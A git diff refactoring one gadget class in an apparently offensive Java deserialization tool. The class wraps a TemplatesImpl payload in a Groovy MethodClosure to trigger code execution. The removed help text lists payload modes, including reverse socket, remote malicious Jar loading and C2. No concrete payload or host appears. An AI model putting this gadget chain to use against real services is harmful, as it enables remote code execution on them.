@@ -5,6 +5,7 @@ import ysomap.bullets.AbstractBullet;
 import ysomap.bullets.Bullet;
 import ysomap.bullets.jdk.TemplatesImplBullet;
 import ysomap.common.annotation.*;
+import ysomap.core.util.DetailHelper;
 
 /**
  * @author wh1t3p1g
@@ -18,16 +19,7 @@ import ysomap.common.annotation.*;
 public class ClosureWithTemplatesImplBullet extends AbstractBullet<Object> {
 
     @NotNull
-    @Require(name = "type", detail = "5种方式（cmd,code,socket,loader,shellcode）:\n" +
-            "1. cmd，body写入具体的系统命令；\n" +
-            "2. code, body写入具体需要插入执行的代码；\n" +
-            "3. socket, body写入`ip:port`\n" +
-            "4. loader, body写入远程恶意Jar地址，写入格式如 `url;classname` 或 `url;os`\n" +
-            "5. c2, body写入C2相关参数，写入格式如 `path` 或 `url`, 具体查看相关 c2 说明 ")
-    private String type = "cmd";
-
-    @NotNull
-    @Require(name = "body" ,detail = "evil code body")
+    @Require(name = "body" ,detail = DetailHelper.BODY)
     private String body = "";
 
     @NotNull
@@ -42,7 +34,7 @@ public class ClosureWithTemplatesImplBullet extends AbstractBullet<Object> {
 
     @Override
     public Object getObject() throws Exception {
-        Bullet bullet = TemplatesImplBullet.newInstance(type, body, effect, exception);
+        Bullet bullet = TemplatesImplBullet.newInstance(body, effect, exception);
         return new MethodClosure(bullet.getObject(), "getOutputProperties");
     }
 
